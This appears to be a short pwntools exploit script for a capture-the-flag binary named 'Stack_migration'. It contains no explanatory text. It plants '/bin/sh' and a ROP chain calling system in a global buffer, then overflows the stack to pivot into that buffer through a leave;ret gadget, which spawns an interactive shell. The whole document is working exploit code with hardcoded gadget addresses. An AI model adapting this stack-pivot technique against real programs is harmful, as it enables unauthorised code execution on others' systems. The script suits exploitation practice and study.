from pwn import *
p = process('./Stack_migration')
context(os='linux',arch='amd64',log_level='debug')
elf = ELF('./Stack_migration')
ELF = ELF('/lib/x86_64-linux-gnu/libc.so.6')

gdb.attach(p,'b *0x401230')
rdi = 0x401323
ret = 0x40101a
name = 0x4040A0
# ROPgadget --binary ./Stack_migration | grep leave ; ret
leave = 0x401275
binsh = name

# payload1 = b'/bin/sh\x00' + p64(ret)*0x101 + p64(rdi) + p64(binsh) + p64(elf.sym['system'])
payload1 = b'/bin/sh\x00'.ljust(0xa00,b'\x00') + p64(rdi) + p64(binsh) + p64(elf.sym['system'])
p.sendafter(b'name?\n', payload1)

# payload2 = b'a'*0x8 + p64(name) + p64(leave)
payload2 = b'a'*8 + p64(name + 0xa00 - 8) + p64(leave)
p.sendafter(b'>>', payload2)
# pause()
p.interactive()